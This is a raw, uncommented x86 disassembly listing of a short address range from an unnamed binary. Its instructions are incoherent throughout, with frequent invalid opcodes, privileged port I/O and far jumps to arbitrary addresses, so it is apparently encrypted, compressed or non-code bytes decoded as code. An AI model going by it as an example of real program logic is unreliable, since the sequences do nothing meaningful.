  41a6e1:	rol    bl,cl
  41a6e3:	int3   
  41a6e4:	add    eax,0x5603c201
  41a6e9:	sub    al,0xc4
  41a6eb:	xor    ebp,0xf2bb19c0
  41a6f1:	retf   
  41a6f2:	xor    BYTE PTR [edi-0x4c96aa14],ah
  41a6f8:	int3   
  41a6f9:	test   al,0x21
  41a6fb:	mov    ch,0x83
  41a6fd:	out    0x1,al
  41a6ff:	(bad)  
  41a700:	jns    0x41a6de
  41a702:	pop    ds
  41a703:	shr    cl,0x4d
  41a706:	clc    
  41a707:	stos   BYTE PTR es:[edi],al
  41a708:	repnz fsubr QWORD PTR [edi]
  41a70b:	xchg   ebp,eax
  41a70c:	test   al,0x1b
  41a70e:	pusha  
  41a70f:	(bad)  
  41a710:	leave  
  41a711:	mov    ebp,0xe2cbb811
  41a716:	sar    ebp,0x2d
  41a719:	or     BYTE PTR [esi+0x78],ah
  41a71c:	inc    eax
  41a71d:	push   ss
  41a71e:	ins    DWORD PTR es:[edi],dx
  41a71f:	mov    DWORD PTR [edi+0x15],0xd279b8f2
  41a726:	out    dx,eax
  41a727:	cli    
  41a728:	aas    
  41a729:	mov    dl,bh
  41a72b:	push   ecx
  41a72c:	cld    
  41a72d:	jae    0x41a75d
  41a72f:	sahf   
  41a730:	sbb    ebx,DWORD PTR [ebp+0x37]
  41a733:	int    0x1d
  41a735:	jl     0x41a759
  41a737:	aaa    
  41a738:	dec    eax
  41a739:	xchg   ecx,eax
  41a73a:	sub    eax,0xfb7432f5
  41a73f:	stc    
  41a740:	loope  0x41a6c4
  41a742:	ins    DWORD PTR es:[edi],dx
  41a743:	je     0x41a7a7
  41a745:	mov    bl,bl
  41a747:	jle    0x41a7bb
  41a749:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a74a:	adc    edi,DWORD PTR [ecx+0x7c]
  41a74d:	cwde   
  41a74e:	and    al,0xda
  41a750:	pop    edi
  41a751:	sbb    dl,BYTE PTR [ebx+eax*4]
  41a754:	sub    eax,0x8a4b8b3a
  41a759:	repnz cmp eax,DWORD PTR [ecx+0x20025f76]
  41a760:	(bad)  
  41a761:	cmp    DWORD PTR [ebp-0x28551151],esp
  41a767:	mov    eax,ds:0x777c445c
  41a76c:	adc    DWORD PTR [edi+0x7e],0x8e333dd
  41a773:	dec    BYTE PTR gs:[edx+0x22]
  41a777:	xchg   edx,eax
  41a778:	icebp  
  41a779:	mov    ebx,0x15a58371
  41a77e:	in     eax,dx
  41a77f:	cwde   
  41a780:	mov    dl,0xdb
  41a782:	cld    
  41a783:	dec    ebx
  41a784:	pop    edi
  41a785:	xchg   ebp,eax
  41a786:	rcr    DWORD PTR [edx-0x3598e1b3],0x40
  41a78d:	inc    edi
  41a78e:	jg     0x41a7e2
  41a790:	daa    
  41a791:	cmp    al,0x5d
  41a793:	(bad)  
  41a794:	icebp  
  41a795:	add    ah,ah
  41a797:	xchg   edi,eax
  41a798:	mov    edx,cs
  41a79a:	mov    ds:0x60ea069c,eax
  41a79f:	int    0x42
  41a7a1:	lea    esp,[eax]
  41a7a3:	push   ecx
  41a7a4:	sub    ecx,DWORD PTR [eax]
  41a7a6:	add    al,0x2d
  41a7a8:	sti    
  41a7a9:	shrd   DWORD PTR [ebx+0x3923b55e],ebp,0xef
  41a7b1:	jg     0x41a7a5
  41a7b3:	or     dh,BYTE PTR [eax]
  41a7b5:	js     0x41a7fa
  41a7b7:	jle    0x41a770
  41a7b9:	xchg   edx,eax
  41a7ba:	inc    esi
  41a7bb:	jo     0x41a7ae
  41a7bd:	xor    cl,BYTE PTR [ecx-0x57814392]
  41a7c3:	div    DWORD PTR [edx]
  41a7c5:	int    0x6b
  41a7c7:	sbb    DWORD PTR [esi],ecx
  41a7c9:	jecxz  0x41a794
  41a7cb:	dec    ebp
  41a7cc:	mov    cl,0xc4
  41a7ce:	mov    edi,0xa06e42a0
  41a7d3:	mov    ebx,0x3e5f854c
  41a7d8:	ins    DWORD PTR es:[edi],dx
  41a7d9:	add    al,0x19
  41a7db:	sub    ebx,DWORD PTR [ebx+0x2380b57a]
  41a7e1:	cmp    DWORD PTR [eax],0xf54d84f5
  41a7e7:	cmp    eax,0xaf976228
  41a7ec:	fadd   QWORD PTR [edx-0x72646ed1]
  41a7f2:	push   0x72
  41a7f4:	lds    esi,FWORD PTR [eax+0x4dab9724]
  41a7fa:	jg     0x41a7b2
  41a7fc:	inc    ecx
  41a7fd:	or     eax,0x385f6535
  41a802:	push   esp
  41a803:	mov    WORD PTR [ebp-0x1f],?
  41a806:	jo     0x41a819
  41a808:	fsubrp st(7),st
  41a80a:	inc    esp
  41a80b:	(bad)  
  41a80c:	lea    esi,[ecx-0x793377e5]
  41a812:	ins    BYTE PTR es:[edi],dx
  41a813:	jae    0x41a843
  41a815:	jp     0x41a886
  41a817:	pop    eax
  41a818:	lock aad 0xf3
  41a81b:	test   BYTE PTR [ebp+0x4],0x53
  41a81f:	scas   al,BYTE PTR es:[edi]
  41a820:	bound  eax,QWORD PTR [esi+0x1cf87695]
  41a826:	sbb    DWORD PTR [edi],ecx
  41a828:	idiv   BYTE PTR [ebp-0x2028e822]
  41a82e:	out    0x9b,eax
  41a830:	push   0x33
  41a832:	je     0x41a844
  41a834:	jbe    0x41a8ac
  41a836:	sbb    DWORD PTR [edi],ebx
  41a838:	test   DWORD PTR [eax],eax
  41a83a:	test   DWORD PTR [ebx],ebp
  41a83c:	xchg   DWORD PTR [edi],esp
  41a83e:	loope  0x41a80f
  41a840:	mov    bl,0x1e
  41a842:	mov    esi,0xe0c03524
  41a847:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a848:	loop   0x41a8a8
  41a84a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a84b:	or     ch,BYTE PTR [esi+0x3a]
  41a84e:	enter  0x4ff7,0xdd
  41a852:	aas    
  41a853:	aam    0x92
  41a855:	pop    esi
  41a856:	cmp    ebp,DWORD PTR [ebp-0x37]
  41a859:	lods   al,BYTE PTR ds:[esi]
  41a85a:	rcr    DWORD PTR [edi+0x5f],cl
  41a85d:	loop   0x41a81e
  41a85f:	mov    cl,0xff
  41a861:	mov    eax,ds:0x535333fd
  41a866:	dec    eax
  41a867:	inc    eax
  41a868:	cmp    DWORD PTR [esi],0xf227f96a
  41a86e:	ins    DWORD PTR es:[edi],dx
  41a86f:	mov    al,ds:0xfa12b0bd
  41a874:	daa    
  41a875:	fwait
  41a876:	sub    ah,cl
  41a878:	cmp    al,0x7a
  41a87a:	imul   edx,DWORD PTR [ecx-0x50],0x7516a02a
  41a881:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a882:	mov    al,0x48
  41a884:	pop    edx
  41a885:	jmp    0x41a844
  41a887:	std    
  41a888:	pop    ecx
  41a889:	mov    eax,ds:0x10af04a9
  41a88e:	pop    ss
  41a88f:	xchg   edi,eax
  41a890:	pop    ds
  41a891:	aas    
  41a892:	pushf  
  41a893:	add    ebp,DWORD PTR [ecx-0x7d2e3084]
  41a899:	xor    dh,bh
  41a89b:	lds    esi,FWORD PTR [ecx-0x4b]
  41a89e:	sbb    cl,BYTE PTR [esi+0x75878084]
  41a8a4:	imul   BYTE PTR [ecx+0x5a349164]
  41a8aa:	int    0x66
  41a8ac:	es mov ch,0xaa
  41a8af:	inc    ecx
  41a8b0:	xchg   edx,eax
  41a8b1:	gs int3 
  41a8b3:	mov    bh,0xae
  41a8b5:	sub    al,0x41
  41a8b7:	test   ecx,edi
  41a8b9:	inc    ebx
  41a8ba:	sub    eax,0x10ae7a5f
  41a8bf:	stos   DWORD PTR es:[edi],eax
  41a8c0:	dec    ecx
  41a8c1:	mov    eax,0xee22aa33
  41a8c6:	fisub  WORD PTR [edi]
  41a8c9:	pushf  
  41a8ca:	mov    eax,ds:0xdd6615ec
  41a8cf:	les    edx,FWORD PTR [esi]
  41a8d1:	dec    edi
  41a8d2:	fisttp DWORD PTR [ebp+0x713cfaba]
  41a8d8:	mov    edi,0xff09cc0d
  41a8dd:	gs mov bl,0x72
  41a8e0:	loope  0x41a8dc
  41a8e2:	xor    bl,bh
  41a8e4:	test   edx,0xf26c671a
  41a8ea:	xor    dl,BYTE PTR ss:[edx+0x78]
  41a8ee:	jge    0x41a93e
  41a8f0:	test   al,0x55
  41a8f2:	jne    0x41a888
  41a8f4:	das    
  41a8f5:	out    dx,eax
  41a8f6:	push   ss
  41a8f7:	push   0x57
  41a8f9:	mov    ds:0x8ad545ef,eax
  41a8fe:	imul   esi,DWORD PTR [eax-0x9],0x54b4c58d
  41a905:	retf   
  41a906:	sub    bh,ah
  41a908:	pop    edi
  41a909:	pop    edx
  41a90a:	ror    ecx,1
  41a90c:	stos   BYTE PTR es:[edi],al
  41a90d:	pushf  
  41a90e:	inc    eax
  41a90f:	sub    BYTE PTR [ebx+0x4a],dh
  41a912:	int3   
  41a913:	jge    0x41a963
  41a915:	rol    BYTE PTR [bp+di-0x69],cl
  41a919:	frstor [ecx+eiz*4+0x3f701cc]
  41a920:	mov    edx,0xf308a89e
  41a925:	push   ebp
  41a926:	mov    bh,0xfb
  41a928:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a929:	adc    edi,DWORD PTR ss:[eax+0x7d55f8b]
  41a930:	out    dx,al
  41a931:	(bad)  
  41a932:	mov    WORD PTR [edi],ss
  41a934:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a935:	stos   DWORD PTR es:[edi],eax
  41a936:	js     0x41a94f
  41a938:	cdq    
  41a939:	dec    eax
  41a93a:	fsub   DWORD PTR [ecx+0xb]
  41a93d:	cmc    
  41a93e:	xorps  xmm4,XMMWORD PTR [esi+edi*4-0x2a7a71d8]
  41a946:	imul   edi,DWORD PTR [eax+0x4eb5c85e],0x56
  41a94d:	mov    bh,BYTE PTR [edx+0x5e]
  41a950:	cwde   
  41a951:	pop    esi
  41a952:	inc    ecx
  41a953:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a954:	mov    esi,0xa594d420
  41a959:	inc    edi
  41a95a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a95b:	outs   dx,DWORD PTR ds:[esi]
  41a95c:	pop    eax
  41a95d:	out    dx,eax
  41a95e:	rcl    esi,1
  41a960:	outs   dx,DWORD PTR ds:[esi]
  41a961:	cmp    DWORD PTR [edi-0x12b27f4b],0x89268430
  41a96b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a96c:	pop    ds
  41a96d:	lds    ecx,FWORD PTR ds:[edx-0x3a]
  41a971:	or     DWORD PTR [eax+ebp*2-0x3b],0x18aeba32
  41a979:	mov    BYTE PTR [eax],ah
  41a97b:	test   al,0x39
  41a97d:	xor    DWORD PTR [ebx+0x74],edx
  41a980:	cwde   
  41a981:	sbb    eax,0x98c6a789
  41a986:	in     al,0x2c
  41a988:	dec    esi
  41a989:	and    DWORD PTR [edi+0x72d79468],esp
  41a98f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a990:	pop    edi
  41a991:	push   0x5
  41a993:	mov    dl,bl
  41a995:	xlat   BYTE PTR ds:[ebx]
  41a996:	fucomi st,st(1)
  41a998:	dec    edi
  41a999:	adc    BYTE PTR [eax],ah
  41a99b:	xor    esi,DWORD PTR [ebp+ebx*1-0x4a965d01]
  41a9a2:	sub    bl,ah
  41a9a4:	push   edi
  41a9a5:	(bad)  
  41a9a6:	or     dh,bl
  41a9a8:	sbb    ebp,esi
  41a9aa:	xchg   ebp,eax
  41a9ab:	lock adc DWORD PTR [edi+0x5d],esi
  41a9af:	sub    BYTE PTR [ecx-0x29],0xd6
  41a9b3:	es es int3 
  41a9b6:	xchg   esp,eax
  41a9b7:	imul   ebp,edx,0x31
  41a9ba:	or     al,0xc1
  41a9bc:	fdiv   QWORD PTR [esi+0x1b]
  41a9bf:	stc    
  41a9c0:	push   esi
  41a9c1:	jle    0x41a979
  41a9c3:	pop    esi
  41a9c4:	inc    eax
  41a9c5:	sub    eax,0xdac33bfe
  41a9ca:	(bad)  
  41a9cb:	idiv   DWORD PTR [eax-0x56]
  41a9ce:	fdiv   DWORD PTR ds:0x81763749
  41a9d4:	or     al,0xec
  41a9d6:	push   cs
  41a9d7:	xchg   ecx,eax
  41a9d8:	sbb    DWORD PTR [edx],edi
  41a9da:	lock mov ds:0x4e24548f,eax
  41a9e0:	xor    al,BYTE PTR [ecx-0x4c]
  41a9e3:	sub    al,0x24
  41a9e5:	push   eax
  41a9e6:	dec    ebx
  41a9e7:	adc    DWORD PTR [ecx],esi
  41a9e9:	mov    ah,0x2b
  41a9eb:	cdq    
  41a9ec:	cwde   
  41a9ed:	gs out dx,al
  41a9ef:	mov    ch,0xf
  41a9f1:	fdiv   st(7),st
  41a9f3:	out    0xc0,eax
  41a9f5:	clc    
  41a9f6:	ja     0x41aa08
  41a9f8:	ror    BYTE PTR [eax+ebp*4],0x70
  41a9fc:	into   
  41a9fd:	adc    bl,BYTE PTR [ecx+0x16]
  41aa00:	es mov edi,0x5c853b95
  41aa06:	sbb    ebp,DWORD PTR [ebx+0x6f]
  41aa09:	popa   
  41aa0a:	jmp    0xab1f63bb
  41aa0f:	out    dx,eax
  41aa10:	das    
  41aa11:	mov    WORD PTR [eax-0x15],ss
  41aa14:	and    ah,bl
  41aa16:	adc    BYTE PTR [ebx-0x2093a510],bl
  41aa1c:	popf   
  41aa1d:	ret    0x470c
  41aa20:	dec    ecx
  41aa21:	mov    ah,0x3e
  41aa23:	and    ecx,ebp
  41aa25:	or     edx,DWORD PTR [esi+eiz*8+0x60]
  41aa29:	or     DWORD PTR [edx-0x70],edx
  41aa2c:	loope  0x41a9fb
  41aa2e:	dec    ebx
  41aa2f:	in     eax,dx
  41aa30:	popa   
  41aa31:	mov    esp,0x7f9789dd
  41aa36:	mov    esp,0x20a51c28
  41aa3b:	mov    bh,0xea
  41aa3d:	call   0x3520:0x223d1ef6
  41aa44:	int3   
  41aa45:	out    0xb2,al
  41aa47:	fwait
  41aa48:	and    DWORD PTR [ebp+0x56dffcae],edx
  41aa4e:	(bad)  
  41aa4f:	(bad)  
  41aa50:	fidivr DWORD PTR [eax-0x36e19ba0]
  41aa56:	and    BYTE PTR [ecx],0xc9
  41aa59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aa5a:	cwde   
  41aa5b:	pushf  
  41aa5c:	dec    ecx
  41aa5d:	jp     0x41aa06
  41aa5f:	aam    0x18
  41aa61:	jecxz  0x41aaa2
  41aa63:	sbb    DWORD PTR [edx-0x42],edx
  41aa66:	sbb    BYTE PTR [ebp+0x781c0743],ah
  41aa6c:	ss test edx,edi
  41aa6f:	xchg   ecx,eax
  41aa70:	sub    DWORD PTR [edx],eax
  41aa72:	into   
  41aa73:	push   ebx
  41aa74:	sub    edi,DWORD PTR [esi]
  41aa76:	bound  ebx,QWORD PTR [ebp+0x2a]
  41aa79:	cmp    eax,ebp
  41aa7b:	je     0x41aaab
  41aa7d:	fnstsw WORD PTR [esi-0x7132df3b]
  41aa83:	cwde   
  41aa84:	int    0x5a
  41aa86:	popa   
  41aa87:	mov    esp,DWORD PTR [ecx+edi*4-0x16]
  41aa8b:	in     al,dx
  41aa8c:	jnp    0x41aab8
  41aa8e:	inc    eax
  41aa8f:	push   edi
  41aa90:	gs iret 
  41aa92:	xchg   esp,eax
  41aa93:	jl     0x41aad9
  41aa95:	ins    DWORD PTR es:[edi],dx
  41aa96:	in     al,dx
  41aa97:	mov    eax,DWORD PTR [ebx]
  41aa99:	jns    0x41aaf7
  41aa9b:	xor    BYTE PTR [esp+eiz*8],al
  41aa9e:	ss dec edx
  41aaa0:	pop    edx
  41aaa1:	mov    edi,0xa8aa0632
  41aaa6:	inc    ebx
  41aaa7:	jb     0x41aa79
  41aaa9:	retf   0x1563
  41aaac:	dec    ecx
  41aaad:	aad    0x43
  41aaaf:	sbb    ecx,DWORD PTR [ebx+ecx*1+0x37]
  41aab3:	pop    eax
  41aab4:	loope  0x41aae5
  41aab6:	jmp    0x41aab7
  41aab8:	pushf  
  41aab9:	and    dh,0x68
  41aabc:	sbb    DWORD PTR [ecx],eax
  41aabe:	xor    al,0xac
  41aac0:	add    DWORD PTR [ebx-0x43a03762],0xf7d14faf
  41aaca:	mov    BYTE PTR [edi],dh
  41aacc:	pop    ds
  41aacd:	jae    0x41aa8a
  41aacf:	bound  ebx,QWORD PTR [eax+0x585fbf7c]
  41aad5:	xchg   ecx,eax
  41aad6:	shr    BYTE PTR [ecx+0x67],cl
  41aad9:	call   0x66ffdb1d
  41aade:	xchg   ecx,eax
  41aadf:	cdq    
  41aae0:	hlt    
  41aae1:	push   eax
  41aae2:	adc    DWORD PTR [ebx+ebp*2-0x13],ebx
  41aae6:	xor    dh,BYTE PTR [ecx-0x6965d4f7]
  41aaec:	ja     0x41ab5f
  41aaee:	(bad)  
  41aaf0:	in     al,0xf8
  41aaf2:	mov    esi,0x4131dc89
  41aaf7:	cmp    ah,BYTE PTR [edx-0x76]
  41aafa:	adc    dh,BYTE PTR [edx]
  41aafc:	jmp    0x41ab49
  41aafe:	aad    0x37
  41ab00:	inc    edi
  41ab01:	pusha  
  41ab02:	lods   al,BYTE PTR ds:[esi]
  41ab03:	fs jns 0x41ab3a
  41ab06:	ins    BYTE PTR es:[edi],dx
  41ab07:	mov    ds:0xdb6033b8,al
  41ab0c:	outs   dx,BYTE PTR ds:[esi]
  41ab0d:	gs aad 0x1a
  41ab10:	cmc    
  41ab11:	ror    BYTE PTR [ecx],0x41
  41ab14:	add    al,BYTE PTR [edx-0x67970922]
  41ab1a:	inc    ebp
  41ab1b:	leave  
  41ab1c:	xor    esp,ebp
  41ab1e:	lea    edx,ds:0x8db9ec6b
  41ab24:	enter  0x7c9b,0x1c
  41ab28:	adc    BYTE PTR [esi],bh
  41ab2a:	aam    0xca
  41ab2c:	jnp    0x41aac1
  41ab2e:	leave  
  41ab2f:	test   bh,0xd2
  41ab32:	sub    cl,0x4b
  41ab35:	pop    eax
  41ab36:	or     al,0x35
  41ab38:	xor    DWORD PTR [ebx-0x6f0392aa],esi
  41ab3e:	mov    ch,0x14
  41ab40:	push   es
  41ab41:	sub    al,BYTE PTR [edi-0x3b]
  41ab44:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab45:	fistp  DWORD PTR [eax]
  41ab47:	pop    edi
  41ab48:	sub    BYTE PTR [eax+0x2e88947e],dh
  41ab4e:	push   es
  41ab4f:	xor    BYTE PTR [edx-0x50],bl
  41ab52:	ss dec eax
  41ab54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ab55:	in     eax,dx
  41ab56:	fld    DWORD PTR gs:[esi+0x67]
  41ab5a:	cmp    ecx,ebp
  41ab5c:	ret    
  41ab5d:	cmp    DWORD PTR [esi+0x74],ebx
  41ab60:	int    0x98
  41ab62:	and    ebp,DWORD PTR [edx+edi*2+0xa285ca]
  41ab69:	mov    ds:0xdc64a59e,eax
  41ab6e:	shl    BYTE PTR [ecx],1
  41ab70:	push   es
  41ab71:	fs das 
  41ab73:	xchg   BYTE PTR [ebp+0x6d],dh
  41ab76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ab77:	stos   DWORD PTR es:[edi],eax
  41ab78:	mov    ch,0x60
  41ab7a:	xlat   BYTE PTR ds:[ebx]
  41ab7b:	sbb    DWORD PTR [edi],edi
  41ab7d:	push   ebp
  41ab7e:	mov    edi,0x85c0ae5
  41ab83:	lods   eax,DWORD PTR ds:[esi]
  41ab84:	daa    
  41ab85:	cmp    cl,BYTE PTR [edi+0x29]
  41ab88:	(bad)  
  41ab89:	xor    ebp,DWORD PTR [ebx+0x4ae41691]
  41ab8f:	gs jne 0x41ab30
  41ab92:	cmp    ecx,DWORD PTR [edi]
  41ab94:	pop    ss
  41ab95:	fcmovnbe st,st(3)
  41ab97:	cmp    al,0xb8
  41ab99:	in     eax,0xc9
  41ab9b:	retf   
  41ab9c:	jmp    0x41ab6d
  41ab9e:	das    
  41ab9f:	gs pop edi
  41aba1:	hlt    
  41aba2:	jne    0x41abc8
  41aba4:	add    BYTE PTR [ecx-0x5],0x20
  41aba8:	fisttp WORD PTR [ebp-0x4f5701c4]
  41abae:	pop    esp
  41abaf:	sub    DWORD PTR [ebx+0x7],ebp
  41abb2:	int3   
  41abb3:	lock cmp ch,BYTE PTR gs:[edi-0x72]
  41abb8:	sbb    al,BYTE PTR [ebx+0x2c]
  41abbb:	or     bl,BYTE PTR [edi]
  41abbd:	in     al,0x1d
  41abbf:	and    BYTE PTR [edi],bl
  41abc1:	jmp    0x7c493ac0
  41abc6:	lahf   
  41abc7:	jmp    0x6ad9459f
  41abcc:	iret   
  41abcd:	mov    edi,0x954b7959
  41abd2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abd3:	cmp    eax,0xfc4891a7
  41abd8:	sbb    DWORD PTR [eax+0x35033459],0x6b
  41abdf:	jo     0x41ab89
  41abe1:	rcr    DWORD PTR [ebx-0x7e8ad961],1
  41abe7:	add    DWORD PTR [ebp+0x5b],ebp
  41abea:	mov    ch,0x94
  41abec:	inc    edi
  41abed:	aas    
  41abee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abef:	jle    0x41ac64
  41abf1:	jl     0x41ac70
  41abf3:	cdq    
  41abf4:	aad    0xbb
  41abf6:	cmp    DWORD PTR [ebp-0x2cd47068],esi
  41abfc:	loopne 0x41abc2
  41abfe:	mov    bl,0xd5
  41ac00:	pop    esi
  41ac01:	pop    edi
  41ac02:	xchg   DWORD PTR ds:0x2a400451,ecx
  41ac08:	jb     0x41abe1
  41ac0a:	or     edi,DWORD PTR [ebp-0x2b1bf484]
  41ac10:	inc    esp
  41ac11:	fxch   st(0)
  41ac13:	or     ah,BYTE PTR [ebx-0x4d3d6ec0]
  41ac19:	xlat   BYTE PTR ds:[ebx]
  41ac1a:	(bad)  
  41ac1b:	in     al,dx
  41ac1c:	imul   DWORD PTR [ebp+0x1d]
  41ac1f:	inc    edx
  41ac20:	pushf  
  41ac21:	outs   dx,DWORD PTR ds:[esi]
  41ac22:	pop    eax
  41ac23:	(bad)  
  41ac24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac25:	dec    ebx
  41ac26:	rcl    BYTE PTR [eax+edi*1-0x68324691],0x9e
  41ac2e:	and    bh,BYTE PTR [eax+0x44]
  41ac31:	clc    
  41ac32:	fdivr  QWORD PTR [esp+ecx*1]
  41ac35:	pop    edx
  41ac36:	pop    eax
  41ac37:	in     al,0x1f
  41ac39:	push   0x6d
  41ac3b:	dec    edx
  41ac3c:	mov    bl,0xf3
  41ac3e:	push   eax
  41ac3f:	fstp   QWORD PTR [ebx-0x17]
  41ac42:	mov    eax,0x98825d4
  41ac47:	mov    es,WORD PTR [edi-0x4160257e]
  41ac4d:	out    dx,al
  41ac4e:	fsub   DWORD PTR [edi]
  41ac50:	dec    esp
  41ac51:	inc    ecx
  41ac52:	cld    
  41ac53:	aas    
  41ac54:	repnz (bad) 
  41ac56:	fidivr WORD PTR [ebp+ecx*8+0x658d3499]
  41ac5d:	ror    DWORD PTR [edi],cl
  41ac5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac60:	push   esp
  41ac61:	je     0x41accb
  41ac63:	in     eax,dx
  41ac64:	call   0xcd45:0x4be63b1e
  41ac6b:	mov    al,BYTE PTR [ebx+0x4e73506]
  41ac71:	mov    ebp,DWORD PTR [ecx-0x50c7e4ed]
  41ac77:	mov    edi,0xe7eb8a57
  41ac7c:	popf   
  41ac7d:	push   edx
  41ac7e:	cmp    ebp,eax
  41ac80:	es ins BYTE PTR es:[edi],dx
  41ac82:	push   ecx
  41ac83:	pushf  
  41ac84:	sahf   
  41ac85:	xor    DWORD PTR [esi+0x577d7a51],ebp
  41ac8b:	into   
  41ac8c:	icebp  
  41ac8d:	adc    eax,0x57759fd5
  41ac92:	push   ds
  41ac93:	sbb    DWORD PTR [esp+eax*8+0x58],edi
  41ac97:	adc    cl,BYTE PTR [ebx]
  41ac99:	sub    bl,0xf5
  41ac9c:	test   BYTE PTR [ecx+0xcb3c136],cl
  41aca2:	test   edx,ebp
  41aca4:	cmp    ecx,DWORD PTR gs:[edx+eax*1-0xb]
  41aca9:	dec    esi
  41acaa:	rcl    DWORD PTR [esi+ecx*8],1
  41acad:	pop    edx
  41acae:	adc    eax,0xaaafe70c
  41acb3:	pop    edx
  41acb4:	or     BYTE PTR [edi-0x75],bh
  41acb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41acb8:	test   DWORD PTR [edi],ebx
  41acba:	sub    al,0xb8
  41acbc:	nop
  41acbd:	push   eax
  41acbe:	mov    DWORD PTR [edx],0x3ccb3bf
  41acc4:	mov    ch,0x3d
  41acc6:	mov    al,ds:0x1f28d940
  41accb:	pop    esi
  41accc:	add    bl,cl
  41acce:	fild   QWORD PTR ds:0xbc2c1d3
  41acd4:	aad    0xe2
  41acd6:	push   0xd78ab94a
  41acdb:	repnz adc eax,0x50fa15b9
  41ace1:	ficom  WORD PTR [ebx+edx*4-0x3e458c55]
  41ace8:	fnstcw WORD PTR [ebp-0x35c376ae]
  41acee:	mov    ebp,0x84df9b08
  41acf3:	mov    ?,WORD PTR [edx]
  41acf5:	xchg   edi,eax
  41acf6:	add    ecx,edi
  41acf8:	or     bl,0x2d
  41acfb:	jmp    0xa3ac60c2
  41ad00:	dec    edi
  41ad01:	push   ebx
  41ad02:	test   eax,0xe99bd3a4
  41ad07:	scas   al,BYTE PTR es:[edi]
  41ad08:	dec    ebx
  41ad09:	(bad)  
  41ad0a:	mov    ah,0xc4
  41ad0c:	jmp    0x4e5e:0x5c64576
  41ad13:	cmc    
  41ad14:	mov    ds:0xa6353101,al
  41ad19:	jmp    DWORD PTR [eax]
  41ad1b:	and    ebx,DWORD PTR [edi]
  41ad1d:	lods   al,BYTE PTR gs:[esi]
  41ad1f:	mov    bh,0xad
  41ad21:	popa   
  41ad22:	dec    ebp
  41ad23:	pusha  
  41ad24:	xor    al,dl
  41ad26:	mov    WORD PTR [esi-0x4e],ss
  41ad29:	clc    
  41ad2a:	jno    0x41ad38
  41ad2c:	ret    0xf93e
  41ad2f:	adc    DWORD PTR [ebx+0x2204f2c],esi
  41ad35:	ss inc edx
  41ad37:	fnstsw WORD PTR [ebp-0x5a]
  41ad3a:	add    dh,dl
  41ad3c:	pop    es
  41ad3d:	iret   
  41ad3e:	pop    ss
  41ad3f:	imul   edx,edx,0x18
  41ad42:	xchg   ebx,eax
  41ad43:	cmp    BYTE PTR [esp+edx*1+0x2b6fc036],dh
  41ad4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad4b:	xchg   DWORD PTR [ebp-0x4d],edi
  41ad4e:	jne    0x41ad2f
  41ad50:	outs   dx,BYTE PTR ds:[esi]
  41ad51:	pop    eax
  41ad52:	push   edi
  41ad53:	push   edx
  41ad54:	cmp    BYTE PTR [ebx],al
  41ad56:	cmp    eax,0x63018124
  41ad5b:	mov    gs,WORD PTR [ebx+0x4b]
  41ad5e:	cld    
  41ad5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ad60:	xor    al,BYTE PTR [eax-0x281f6759]
  41ad66:	adc    DWORD PTR [edx],ecx
  41ad68:	jns    0x41ad22
  41ad6a:	and    DWORD PTR [ebx+0x79660500],esp
  41ad70:	sub    DWORD PTR [ebx+0x3c59e112],ebp
  41ad76:	xchg   edx,eax
  41ad77:	mov    edx,0x5e84c114
  41ad7c:	dec    ecx
  41ad7d:	call   0x6119:0x1cb887bf
  41ad84:	xchg   ecx,eax
  41ad85:	retf   0x4eb6
  41ad88:	or     bh,BYTE PTR [ebx+0x5be61e53]
  41ad8e:	dec    ecx
  41ad8f:	repnz ins DWORD PTR es:[edi],dx
  41ad91:	clc    
  41ad92:	push   ecx
  41ad93:	jmp    FWORD PTR [esi-0x39eeec1a]
  41ad99:	repz push cs
  41ad9b:	sbb    BYTE PTR [edi],cl
  41ad9d:	and    BYTE PTR [edi],ch
  41ad9f:	xor    ebx,ecx
  41ada1:	xchg   BYTE PTR [esp+esi*2],bh
  41ada4:	sbb    BYTE PTR [ecx+0x3302a1e6],bl
  41adaa:	mov    al,ds:0x8691c2d8
  41adaf:	test   ch,ch
  41adb1:	fs stc 
  41adb3:	lsl    edi,ax
  41adb6:	mov    bl,0xee
  41adb8:	je     0x41ad90
  41adba:	mov    es,WORD PTR [ebx-0x52fad51]
  41adc0:	and    eax,0x118f231d
  41adc5:	cmp    edx,DWORD PTR [ecx+0x1c]
  41adc8:	sar    BYTE PTR [bx],cl
  41adcb:	mov    esi,0xa3474de9
  41add0:	(bad)  
  41add1:	cmp    eax,0x8bb34f
  41add6:	add    ebx,eax
  41add8:	mov    dh,0x98
  41adda:	and    eax,edx
  41addc:	push   edi
  41addd:	out    0x2e,eax
  41addf:	dec    ebx
  41ade0:	jns    0x41ae02
  41ade2:	inc    edx
  41ade3:	sar    BYTE PTR [eax+0x70514727],cl
  41ade9:	jmp    0x25cac93b
  41adee:	inc    esi
  41adef:	sar    BYTE PTR [edi+0x5788c51a],1
  41adf5:	ja     0x41adb8
  41adf7:	push   ecx
  41adf8:	(bad)  
  41adf9:	imul   esi,DWORD PTR [eax-0x7a9ef4d0],0x4
  41ae00:	fistp  QWORD PTR [esi+0x74]
  41ae03:	cmp    al,0xf9
  41ae05:	or     DWORD PTR [ecx],ecx
  41ae07:	in     eax,0x80
  41ae09:	les    esp,FWORD PTR [eax]
  41ae0b:	mov    ecx,0x4320cf8d
